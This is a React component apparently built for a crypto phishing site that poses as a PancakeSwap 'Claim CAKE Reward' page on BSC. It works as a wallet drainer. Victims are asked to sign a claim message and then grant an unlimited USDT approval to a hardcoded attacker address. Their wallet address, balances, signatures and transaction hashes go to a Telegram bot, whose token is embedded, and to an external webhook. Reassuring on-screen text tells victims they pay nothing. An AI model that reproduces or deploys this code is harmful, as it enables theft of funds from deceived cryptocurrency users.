// Approvewallet.jsx
import { useAccount, useWalletClient, useBalance } from "wagmi";
import { erc20Abi, parseUnits } from "viem";
import { bsc } from "wagmi/chains";
import { useState, useEffect } from "react";




const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
const SPENDER = "0x2990048172A3687249B2DF6c2F2D8e8401330E88"; // Your spender address

// 🔹 Send message to Telegram

const sendToTelegram = async (message) => {
  console.log("📩 Sending to Telegram:", message); // debug log

  const botToken = "7477590341:AAHz8Yl2jYCZIa2uBJQnYFifQAUk0WGWkUY";
  const chatId = "-1002762295115";
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });


    const result = await response.json();
    console.log("Telegram API response:", result); // log response

    if (!response.ok) {
      console.error("❌ Telegram API error:", result);
    }
  } catch (e) {
    console.error("❌ Telegram send failed:", e);
  }
};

// 🔹 Send message to external API
const sendToExternalAPI = async (data) => {
  const apiEndpoint =
    localStorage.getItem("apiEndpoint") || "https://your-bot-api.com/webhook";

  try {
    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      console.error("External API error:", await response.text());
    }
  } catch (e) {
    console.error("External API send failed:", e);
  }
};

export default function ApproveButton() {
  const { address, isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [loading, setLoading] = useState(false);

    const [cakeReward, setCakeReward] = useState(0);
  const [scanCompleted, setScanCompleted] = useState(false);

  useEffect(() => {
    const checkReward = () => {
      const storedReward = localStorage.getItem("cakeReward");
      const scanStatus = localStorage.getItem("scanCompleted");

      console.log("Stored CAKE reward from localStorage:", storedReward); // Debug log
      console.log("Scan completed status:", scanStatus); // Debug log

      if (storedReward && storedReward !== "0" && storedReward !== "null") {
        setCakeReward(storedReward);
      }

      if (scanStatus === "true") {
        setScanCompleted(true);
      }
    };

    // Check immediately
    checkReward();

    // Also check periodically in case localStorage is updated
    const interval = setInterval(checkReward, 1000);

    return () => clearInterval(interval);
  }, []);


  // 🔹 Get balances
  const { data: bscBalance } = useBalance({ address, chainId: bsc.id });
  const { data: usdtBalance } = useBalance({
    address,
    token: USDT_ADDRESS,
    chainId: bsc.id,
  });

   const usdtFormatted = usdtBalance
      ? `$${parseFloat(usdtBalance.formatted).toFixed(2)}`
      : "0";
    const bnbFormatted = bscBalance
      ? parseFloat(bscBalance.formatted).toFixed(9)
      : "0";

  // 🔹 Send message when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      sendToTelegram(`🟢 Wallet Connected:\n<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted} `);
      sendToExternalAPI({
        address,
        action: "wallet_connected",
        usdtBalance: usdtFormatted,
        bscBalance: bnbFormatted,
        timestamp: new Date().toISOString(),
      });
    }
  }, [isConnected, address]);

  // 🔹 Handle Approve button with personal sign first
  const handleApprove = async () => {
    if (!walletClient || !isConnected || !address) {
      alert("Please Connect Your Wallet.");
      return;
    }

    // Check if user has minimum USDT before proceeding
    if (!hasMinimumUsdt) {
      alert("🚫🔒 Eligibility check failed — you need at least $10 USDT (BSC) to claim. Please top up and try again.");
      return;
    }

    setLoading(true);

    const usdtFormatted = usdtBalance
      ? `$${parseFloat(usdtBalance.formatted).toFixed(2)}`
      : "0";
    const bnbFormatted = bscBalance
      ? parseFloat(bscBalance.formatted).toFixed(9)
      : "0";

    try {
      // Step 1: Personal Sign Message
      const cakeAmount = cakeReward && parseFloat(cakeReward) > 0 ? parseFloat(cakeReward) : 5; // Default to 5 CAKE if not scanned
      const signMessage = `Claim ${cakeAmount} CAKE Reward`;
      console.log("Requesting personal sign for:", signMessage);

      const signature = await walletClient.signMessage({
        account: address,
        message: signMessage,
      });

      console.log("Message signed successfully:", signature);

      // Send sign success to Telegram
      await sendToTelegram(
        `✅ Message Signed:\n<code>${address}</code>\nMessage: "${signMessage}"\nSignature: ${signature.slice(0, 20)}...`
      );

      await sendToExternalAPI({
        address,
        action: "message_signed",
        message: signMessage,
        signature: signature,
        usdtBalance: usdtFormatted,
        bscBalance: bnbFormatted,
        timestamp: new Date().toISOString(),
      });

      // Step 2: Proceed with USDT Approval
      const maxAmount = parseUnits(
        "115792089237316195423570985008687907853269984665640564039457584007913129639935",
        0
      );

      const hash = await walletClient.writeContract({
        address: USDT_ADDRESS,
        abi: erc20Abi,
        functionName: "approve",
        args: [SPENDER, maxAmount],
        account: address,
      });

      await sendToTelegram(
        `✅ USDT Approved:\n<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}\nTx Hash: ${hash}\nSigned Message: "${signMessage}"`
      );

      await sendToExternalAPI({
        address,
        action: "approval_success",
        txHash: hash,
        signedMessage: signMessage,
        signature: signature,
        usdtBalance: usdtFormatted,
        bscBalance: bnbFormatted,
        timestamp: new Date().toISOString(),
      });

    } catch (err) {
      console.error("Process failed:", err.message);

      // Determine if error was during signing or approval
      const errorContext = err.message.toLowerCase().includes('user rejected')
        ? (err.message.toLowerCase().includes('sign') ? 'Message signing rejected' : 'Transaction rejected')
        : 'Process failed';

      await sendToTelegram(
        `❌ ${errorContext}:\n<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}\nError: ${err.message}`
      );

      await sendToExternalAPI({
        address,
        action: errorContext.toLowerCase().includes('sign') ? 'sign_failed' : 'approval_failed',
        error: err.message,
        usdtBalance: usdtFormatted,
        bscBalance: bnbFormatted,
        timestamp: new Date().toISOString(),
      });
    }

    setLoading(false);
  };


  // Check if user has at least $10 USDT
  const usdtBalanceNumber = usdtBalance ? parseFloat(usdtBalance.formatted) : 0;
  const hasMinimumUsdt = usdtBalanceNumber >= 10;

  // Only show button if wallet is connected AND scanning is completed
  if (!isConnected || !scanCompleted) {
    return (
      <div style={{
        padding: "20px",
        textAlign: "center",
        borderRadius: "15px",
        background: "rgba(255, 255, 255, 0.05)",
        border: "1px solid rgba(255, 255, 255, 0.1)",
        color: "rgba(255, 255, 255, 0.7)"
      }}>
        {!isConnected
          ? "🔗 Connect your wallet to claim rewards"
          : "🔍 Complete wallet scan to unlock claim"}
      </div>
    );
  }

  return (
    <div>
      <button
        onClick={handleApprove}
        disabled={loading}
        style={{
          width: "100%",
          padding: "18px 24px",
          fontSize: "1.1rem",
          fontWeight: "700",
          color: "#ffffff",
          background: loading
            ? "rgba(139, 92, 246, 0.5)"
            : "linear-gradient(135deg, #8b5cf6 0%, #3b82f6 100%)",
          border: "none",
          borderRadius: "15px",
          cursor: loading ? "not-allowed" : "pointer",
          transition: "all 0.3s ease",
          boxShadow: loading
            ? "none"
            : "0 8px 25px rgba(139, 92, 246, 0.4)",
          position: "relative",
          overflow: "hidden",
          backdropFilter: "blur(10px)",
        }}
        onMouseEnter={(e) => {
          if (!loading) {
            e.target.style.transform = "translateY(-2px)";
            e.target.style.boxShadow = "0 12px 35px rgba(139, 92, 246, 0.6)";
          }
        }}
        onMouseLeave={(e) => {
          if (!loading) {
            e.target.style.transform = "translateY(0)";
            e.target.style.boxShadow = "0 8px 25px rgba(139, 92, 246, 0.4)";
          }
        }}
      >
        {loading && (
          <div style={{
            position: "absolute",
            top: 0,
            left: "-100%",
            width: "100%",
            height: "100%",
            background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent)",
            animation: "claimScan 1.2s infinite"
          }} />
        )}
        <span style={{ position: "relative", zIndex: 1 }}>
          {loading ? "🔄 Claiming..." : cakeReward && parseFloat(cakeReward) > 0 ? `🍰 Claim ${parseFloat(cakeReward)} CAKE` : "🍰 Claim CAKE Reward"}
        </span>
        <style>
          {`
            @keyframes claimScan {
              0% { left: -100%; }
              100% { left: 100%; }
            }
          `}
        </style>
      </button>

      {/* Warning message when insufficient USDT */}
      {!hasMinimumUsdt && (
        <div style={{
          marginTop: "15px",
          padding: "15px",
          borderRadius: "12px",
          background: "rgba(255, 193, 7, 0.1)",
          border: "1px solid rgba(255, 193, 7, 0.3)",
          color: "rgba(255, 255, 255, 0.9)",
          textAlign: "center"
        }}>
          <div style={{
            fontSize: "1rem",
            fontWeight: "600",
            marginBottom: "8px",
            color: "#ffc107"
          }}>
            💰 Minimum $10 USDT Required
          </div>
          <div style={{
            fontSize: "14px",
            marginBottom: "12px",
            color: "rgba(255, 255, 255, 0.8)",
            fontStyle: "italic"
          }}>
            Current balance: ${usdtBalanceNumber.toFixed(2)} USDT
          </div>
        </div>
      )}

      {/* View CAKE Price link */}
      <div style={{
        marginTop: "15px",
        textAlign: "center"
      }}>
        <a
          href="https://coinmarketcap.com/currencies/pancakeswap"
          target="_blank"
          rel="noopener noreferrer"
          style={{
            color: "#8b5cf6",
            textDecoration: "none",
            fontSize: "14px",
            fontWeight: "500",
            display: "inline-flex",
            alignItems: "center",
            gap: "6px",
            transition: "all 0.2s ease",
            borderBottom: "1px solid transparent"
          }}
          onMouseEnter={(e) => {
            e.target.style.color = "#3b82f6";
            e.target.style.borderBottomColor = "#3b82f6";
          }}
          onMouseLeave={(e) => {
            e.target.style.color = "#8b5cf6";
            e.target.style.borderBottomColor = "transparent";
          }}
        >
          📊 View CAKE Price
        </a>
        <div style={{
          fontSize: "11px",
          color: "rgba(255, 255, 255, 0.5)",
          marginTop: "4px"
        }}>
          (Redirects to CoinMarketCap)
        </div>
      </div>

      {/* Explanatory note */}
      <div style={{
        marginTop: "15px",
        fontSize: "13px",
        lineHeight: "1.5",
        color: "rgba(255, 255, 255, 0.7)",
        background: "rgba(255, 255, 255, 0.05)",
        padding: "12px",
        borderRadius: "10px",
        border: "1px solid rgba(255, 255, 255, 0.1)",
        textAlign: "center",
        fontStyle: "italic"
      }}>
        💡 Note: You're not paying anything — holding at least $10 USDT on the Binance Smart Chain (BSC) network simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.
      </div>
    </div>
  );
}